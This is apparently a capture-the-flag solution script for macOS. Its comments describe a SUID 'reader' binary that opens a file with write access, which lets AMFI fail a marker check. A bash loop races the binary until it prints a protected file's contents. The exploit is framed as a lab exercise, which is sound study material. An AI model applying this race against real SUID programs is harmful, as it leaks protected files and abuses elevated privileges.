#!/bin/bash
#
#  Solution
#  --------
#  1. The SUID binary reads a "marker" file and dumps a file if it doesn't return an expected value.
#  2. The binary also opens an attacker-controlled file to read its first byte. The issue is that it opens it for write permissions too.
#  3. Solution - open the marker file. AMFI fails it due to the open write file-descriptor.
#

# Abuse AMFI (race)
while true
do
    out=$(/Users/ctf/reader /private/var/tmp/marker/marker | grep -v '^$' | tail -n 1)
    if [[ ! $out =~ ^[0-9]+$ ]]; then
        echo $out
        break
    fi
done
